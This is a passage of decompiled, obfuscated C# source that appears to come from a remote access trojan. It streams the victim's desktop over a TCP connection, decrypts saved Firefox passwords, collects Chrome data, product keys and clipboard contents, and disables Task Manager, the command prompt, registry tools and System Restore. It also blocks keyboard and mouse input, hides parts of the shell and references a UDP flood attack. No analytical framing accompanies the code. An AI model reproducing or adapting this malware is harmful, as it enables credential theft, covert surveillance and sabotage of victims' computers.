				if (text2.Contains("<Port>"))
				{
					val3 = val2;
					val3.set_Text(val3.get_Text() + ":" + text2.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + text);
				}
				if (text2.Contains("<User>"))
				{
					val3 = val2;
					val3.set_Text(val3.get_Text() + "User: " + text2.Replace("<User>", "").Replace("</User>", "").Replace("            ", ""));
				}
				if (text2.Contains("<Pass>"))
				{
					val3 = val2;
					val3.set_Text(val3.get_Text() + " Password: " + text2.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + text + "------------------------------------" + text);
				}
			}
			text3 = val2.get_Text();
			return text3;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return text3;
		}
	}

	public object StreamDesktop()
	{
		object result = default(object);
		try
		{
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			if (bool_0)
			{
				using (NetworkStream serializationStream = tcpClient_1.GetStream())
				{
					while (true)
					{
						binaryFormatter.Serialize(serializationStream, CaptureDesktop());
						Thread.Sleep(2);
					}
				}
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			tcpClient_1.Close();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int int_15, int int_16, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_6, int int_17);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long SwapMouseButton(long bSwap);

	public string GetProductKey(string KeyPath, string ValueName)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(((ServerComputer)Class1.Class0_0).get_Registry().GetValue(KeyPath, ValueName, (object)0));
		if (objectValue == null)
		{
			return "N/A";
		}
		string text = "";
		int num = Information.LBound((Array)objectValue, 1);
		int num2 = Information.UBound((Array)objectValue, 1);
		checked
		{
			for (int i = num; i <= num2; i++)
			{
				text = text + " " + Conversion.Hex(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue, new object[1] { i }, (string[])null)));
			}
			int num3 = 52;
			string[] array = new string[25]
			{
				"B", "C", "D", "F", "G", "H", "J", "K", "M", "P",
				"Q", "R", "T", "V", "W", "X", "Y", "2", "3", "4",
				"6", "7", "8", "9", null
			};
			int num4 = 29;
			int num5 = 15;
			string[] array2 = new string[16];
			string[] array3 = new string[31];
			string text2 = "";
			int num6 = 67;
			for (int j = 52; j <= num6; j++)
			{
				array2[j - num3] = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[1] { j }, (string[])null));
				text2 = text2 + " " + Conversion.Hex((object)array2[j - num3]);
			}
			string text3 = "";
			for (int k = num4 - 1; k >= 0; k += -1)
			{
				int num7;
				unchecked
				{
					if (checked(k + 1) % 6 == 0)
					{
						array3[k] = "-";
						text3 += "-";
						continue;
					}
					num7 = 0;
				}
				for (int l = num5 - 1; l >= 0; l += -1)
				{
					int num8 = (int)((long)Math.Round((double)num7 * 256.0) | Conversions.ToLong(array2[l]));
					unchecked
					{
						array2[l] = Conversions.ToString(num8 / 24);
						num7 = num8 % 24;
					}
				}
				array3[k] = array[num7];
				text3 += array[num7];
			}
			return Strings.StrReverse(text3);
		}
	}

	public object loadchat()
	{
		((Control)Class1.Class2_0.method_0()).Show();
		((Control)Class1.Class2_0.method_0()).Focus();
		object result = default(object);
		return result;
	}

	public object ChangeWallpaper(string sLink)
	{
		WebClient webClient = new WebClient();
		string text = sLink.Substring(checked(sLink.Length - 4));
		if (!File.Exists(Path.GetTempPath() + "wallpaper" + text))
		{
			webClient.DownloadFile(sLink, Path.GetTempPath() + "wallpaper" + text);
		}
		else
		{
			File.Delete(Path.GetTempPath() + "wallpaper" + text);
			webClient.DownloadFile(sLink, Path.GetTempPath() + "wallpaper" + text);
		}
		Image val = Image.FromFile(Path.GetTempPath() + "wallpaper" + text);
		val.Save(Path.GetTempPath() + "\\wallpaper.bmp", ImageFormat.get_Bmp());
		string string_ = Path.GetTempPath() + "\\wallpaper.bmp";
		SystemParametersInfoA(20, 0, ref string_, 1);
		return null;
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_6, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_7, long long_5, long long_6);

	public object changemouse(bool b)
	{
		object result = default(object);
		try
		{
			if (b)
			{
				SwapMouseButton(0L);
				return result;
			}
			SwapMouseButton(256L);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object Cdrom(bool b)
	{
		object result = default(object);
		try
		{
			string string_2;
			string string_;
			if (b)
			{
				string_ = "Set CDAudio Door Open Wait";
				string_2 = Conversions.ToString(0L);
				mciSendStringA(ref string_, ref string_2, 0L, 0L);
				return result;
			}
			string_2 = "Set CDAudio Door Closed Wait";
			string_ = Conversions.ToString(0L);
			mciSendStringA(ref string_2, ref string_, 0L, 0L);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object Taskmanager(bool b)
	{
		if (b)
		{
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"0", RegistryValueKind.DWord);
		}
		else
		{
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
		}
		object result = default(object);
		return result;
	}

	public object cmd(bool b)
	{
		if (b)
		{
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"0", RegistryValueKind.DWord);
		}
		else
		{
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
		}
		object result = default(object);
		return result;
	}

	public object registry(bool b)
	{
		if (b)
		{
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"0", RegistryValueKind.DWord);
		}
		else
		{
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"1", RegistryValueKind.DWord);
		}
		object result = default(object);
		return result;
	}

	public object restore(bool b)
	{
		if (b)
		{
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"0", RegistryValueKind.DWord);
		}
		else
		{
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
		}
		object result = default(object);
		return result;
	}

	public object monitor(bool b)
	{
		if (b)
		{
			SendMessageA_2(((Control)this).get_Handle().ToInt32(), 274, 61808, -1);
		}
		else
		{
			SendMessageA_2(((Control)this).get_Handle().ToInt32(), 274, 61808, 2);
		}
		object result = default(object);
		return result;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int BlockInput(int fBlock);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowPos(int int_15, int int_16, int int_17, int int_18, int int_19, int int_20, int int_21);

	public Image CaptureDesktop()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		Rectangle rectangle = default(Rectangle);
		Bitmap val = null;
		Graphics val2 = null;
		rectangle = Screen.get_PrimaryScreen().get_Bounds();
		val = new Bitmap(rectangle.Width, rectangle.Height, (PixelFormat)135173);
		val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, (CopyPixelOperation)13369376);
		return (Image)(object)val;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int EnableWindow(int hwnd, int nOption);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int FindWindowExA(int hwnd, int nclass, [MarshalAs(UnmanagedType.VBByRefStr)] ref string spz1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string spz2);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ShowWindow(int hwnd, int nCmd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(int hwnd, int msg, int wParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string TextStart);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindow(string string_6, string string_7);

	public object desktop(bool b)
	{
		checked
		{
			if (b)
			{
				long_0 = (long)FindWindow("Progman", null);
				EnableWindow((int)long_0, 1);
			}
			else
			{
				long_0 = (long)FindWindow("Progman", null);
				EnableWindow((int)long_0, 0);
			}
			object result = default(object);
			return result;
		}
	}

	public object keyboardmouse(bool b)
	{
		if (b)
		{
			functions.BlockMyControl(b: false);
		}
		else
		{
			functions.BlockMyControl(b: true);
		}
		object result = default(object);
		return result;
	}

	public object mouseup()
	{
		Point position = new Point(0, 0);
		Cursor.set_Position(position);
		object result = default(object);
		return result;
	}

	public object clock(bool b)
	{
		checked
		{
			if (b)
			{
				long_1 = (long)FindWindow("shell_traywnd", null);
				int hwnd = (int)long_1;
				string spz = "TrayNotifyWnd";
				string spz2 = null;
				long_3 = FindWindowExA(hwnd, 0, ref spz, ref spz2);
				int hwnd2 = (int)long_3;
				spz2 = "TrayClockWClass";
				spz = null;
				long_4 = FindWindowExA(hwnd2, 0, ref spz2, ref spz);
				ShowWindow((int)long_4, 1);
			}
			else
			{
				long_1 = (long)FindWindow("shell_traywnd", null);
				int hwnd3 = (int)long_1;
				string spz2 = "TrayNotifyWnd";
				string spz = null;
				long_3 = FindWindowExA(hwnd3, 0, ref spz2, ref spz);
				int hwnd4 = (int)long_3;
				spz2 = "trayclockwclass";
				spz = null;
				long_4 = FindWindowExA(hwnd4, 0, ref spz2, ref spz);
				ShowWindow((int)long_4, 0);
			}
			object result = default(object);
			return result;
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SendMessageA", ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA_1(int int_15, int int_16, int int_17, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_6);

	public void SetStartCaption(string str)
	{
		try
		{
			int hwnd = (int)FindWindow("Shell_TrayWnd", null);
			string spz = "button";
			string spz2 = null;
			int int_ = FindWindowExA(hwnd, 0, ref spz, ref spz2);
			string string_ = Strings.Mid(str, 1, 5);
			SendMessageA_1(int_, 12, 256, ref string_);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string GetClipboardText()
	{
		IDataObject dataObject = Clipboard.GetDataObject();
		IDataObject val = dataObject;
		if (val.GetDataPresent(DataFormats.Text))
		{
			return Conversions.ToString(val.GetData(DataFormats.Text));
		}
		val = null;
		string result = default(string);
		return result;
	}

	public object notify(bool b)
	{
		checked
		{
			if (b)
			{
				long_1 = (long)FindWindow("shell_traywnd", null);
				int hwnd = (int)long_1;
				string spz = "TrayNotifyWnd";
				string spz2 = null;
				long_3 = FindWindowExA(hwnd, 0, ref spz, ref spz2);
				ShowWindow((int)long_3, 1);
			}
			else
			{
				long_1 = (long)FindWindow("shell_traywnd", null);
				int hwnd2 = (int)long_1;
				string spz2 = "TrayNotifyWnd";
				string spz = null;
				long_3 = FindWindowExA(hwnd2, 0, ref spz2, ref spz);
				ShowWindow((int)long_3, 0);
			}
			object result = default(object);
			return result;
		}
	}

	public object taskbarsh(bool b)
	{
		if (b)
		{
			int int_ = (int)FindWindow("Shell_traywnd", "");
			SetWindowPos(int_, 0, 0, 0, 0, 0, 64);
		}
		else
		{
			int int_2 = (int)FindWindow("Shell_traywnd", "");
			SetWindowPos(int_2, 0, 0, 0, 0, 0, 128);
		}
		object result = default(object);
		return result;
	}

	[DllImport("KERNEL32.DLL", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	public static extern bool Beep(int dwFreq, int dwDuration);

	private static IntPtr smethod_0(IntPtr intptr_0, uint uint_0)
	{
		IntPtr result = default(IntPtr);
		return result;
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "ShowWindow", SetLastError = true)]
	private static extern bool ShowWindow_1(IntPtr intptr_0, int int_15);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool IsWindowVisible(IntPtr intptr_0);

	public object icons(bool b)
	{
		if (b)
		{
			ToggleDesktopIcon.Toggle(z: true);
		}
		else
		{
			ToggleDesktopIcon.Toggle(z: false);
		}
		object result = default(object);
		return result;
	}

	public string[] ListAllDrives()
	{
		return Directory.GetLogicalDrives();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void keybd_event(byte byte_0, byte byte_1, long long_5, long long_6);

	private uint method_0(IntPtr intptr_0, string string_6, Enum3 enum3_0)
	{
		return 0u;
	}

	public static void RunNewForm()
	{
		Application.Run((Form)(object)new chat());
	}

	private void method_1()
	{
		if (((Control)this).get_InvokeRequired())
		{
			object[] array = default(object[]);
			((Control)this).BeginInvoke((Delegate)(EventHandler)delegate
			{
				method_1();
			}, array);
		}
		else
		{
			((Control)Class1.Class2_0.method_0()).Show();
		}
	}

	public object focusdesktop()
	{
		keybd_event(91, 0, 0L, 0L);
		keybd_event(77, 0, 0L, 0L);
		keybd_event(91, 0, 2L, 0L);
		object result = default(object);
		return result;
	}

	public object MuteSound()
	{
		SendMessageW(((Control)this).get_Handle(), 793, ((Control)this).get_Handle(), (IntPtr)524288);
		object result = default(object);
		return result;
	}

	public object ChromeData()
	{
		Class5.smethod_0();
		return Strings.Replace(Conversions.ToString(Class5.object_0), "\r\n", "<>", 1, -1, (CompareMethod)0);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDesktopWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SendMessageA", ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA_2(int int_15, int int_16, int int_17, int int_18);

	public void StartScreenSaver(bool start)
	{
		try
		{
			int desktopWindow = GetDesktopWindow();
			if (start)
			{
				SendMessageA_2(desktopWindow, 274, 61760, 0);
			}
			else
			{
				SendKeys.SendWait("{ESC}");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public object method_2(string Key, string Data)
	{
		((ServerComputer)Class1.Class0_0).get_Registry().GetValue(Key, Data, (object)null);
		return 0;
	}

	public object FFData()
	{
		checked
		{
			object result = default(object);
			try
			{
				string text = "";
				text += "\r\n----------------------------------";
				bool flag = false;
				long num = 0L;
				_ = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
				string path = Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles";
				string[] directories = Directory.GetDirectories(path);
				string[] array = directories;
				foreach (string path2 in array)
				{
					if (flag)
					{
						break;
					}
					string[] files = Directory.GetFiles(path2);
					string[] array2 = files;
					foreach (string input in array2)
					{
						if (flag)
						{
							break;
						}
						if (Regex.IsMatch(input, "signons.sqlite"))
						{
							Class7.smethod_0(path2);
							Class7.string_0 = input;
						}
					}
				}
				string baseName = Class7.string_0;
				Class7.Struct2 @struct = default(Class7.Struct2);
				Class7.Struct2 struct2_ = default(Class7.Struct2);
				Class7.Struct2 struct2_2 = default(Class7.Struct2);
				SQLiteBase sQLiteBase = new SQLiteBase(baseName);
				DataTable dataTable = sQLiteBase.ExecuteQuery("SELECT * FROM moz_logins;");
				DataTable dataTable2 = sQLiteBase.ExecuteQuery("SELECT * FROM moz_disabledHosts;");
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = dataTable2.Rows.GetEnumerator();
					while (enumerator.MoveNext())
					{
						_ = (DataRow)enumerator.Current;
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				num = Class7.smethod_1();
				Class7.smethod_2(num, bool_0: true, 0L);
				IEnumerator enumerator2 = default(IEnumerator);
				try
				{
					enumerator2 = dataTable.Rows.GetEnumerator();
					while (enumerator2.MoveNext())
					{
						DataRow dataRow = (DataRow)enumerator2.Current;
						string text2 = Convert.ToString(dataRow["formSubmitURL"].ToString());
						text = text + "\r\nURL: " + text2;
						StringBuilder stringBuilder = new StringBuilder(dataRow["encryptedUsername"].ToString());
						int value = Class7.smethod_3(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
						IntPtr ptr = new IntPtr(value);
						Class7.Struct2 struct2_3 = (Class7.Struct2)Marshal.PtrToStructure(ptr, typeof(Class7.Struct2));
						if (Class7.smethod_4(ref struct2_3, ref struct2_, 0) == 0 && struct2_.int_2 != 0)
						{
							byte[] array3 = new byte[struct2_.int_2 - 1 + 1];
							ptr = new IntPtr(struct2_.int_1);
							Marshal.Copy(ptr, array3, 0, struct2_.int_2);
							text = text + "\r\nUsername: " + Encoding.ASCII.GetString(array3);
						}
						StringBuilder stringBuilder2 = new StringBuilder(dataRow["encryptedPassword"].ToString());
						int value2 = Class7.smethod_3(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
						ptr = new IntPtr(value2);
						Class7.Struct2 struct2_4 = (Class7.Struct2)Marshal.PtrToStructure(ptr, typeof(Class7.Struct2));
						if (Class7.smethod_4(ref struct2_4, ref struct2_2, 0) == 0 && struct2_2.int_2 != 0)
						{
							byte[] array3 = new byte[struct2_2.int_2 - 1 + 1];
							ptr = new IntPtr(struct2_2.int_1);
							Marshal.Copy(ptr, array3, 0, struct2_2.int_2);
							text = text + "\r\nPassword: " + Encoding.ASCII.GetString(array3);
						}
						text += "\r\n----------------------------------";
					}
				}
				finally
				{
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				result = Strings.Replace(text, "\r\n", "<>", 1, -1, (CompareMethod)0);
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private int method_3(ref DEVMODE devmode_0)
	{
		return method_4(ref devmode_0, -1);
	}

	private int method_4(ref DEVMODE devmode_0, int int_15)
	{
		return NativeMethods.EnumDisplaySettings(null, int_15, ref devmode_0);
	}

	private void method_5(DEVMODE devmode_0)
	{
		NativeMethods.ChangeDisplaySettings(ref devmode_0, 0);
	}

	private void method_6(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetDataObject((object)" ", true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_7(int int_15, int int_16, bool bool_2, int int_17)
	{
		throw new NotImplementedException();
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetDC(IntPtr hwnd);

	private void method_8(object sender, EventArgs e)
	{
		try
		{
			dret.EnterText(RuntimeHelpers.GetObjectValue(object_2));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_9(object sender, DoWorkEventArgs e)
	{
		tcpClient_0.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, Read, null);
	}

	private void method_10(object sender, DoWorkEventArgs e)
	{
		((Control)Class1.Class2_0.method_0()).Show();
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_11()
	{
		StreamDesktop();
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_12()
	{
		AttackUDP();
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_13(object sender, EventArgs e)
	{
		method_1();
	}
}
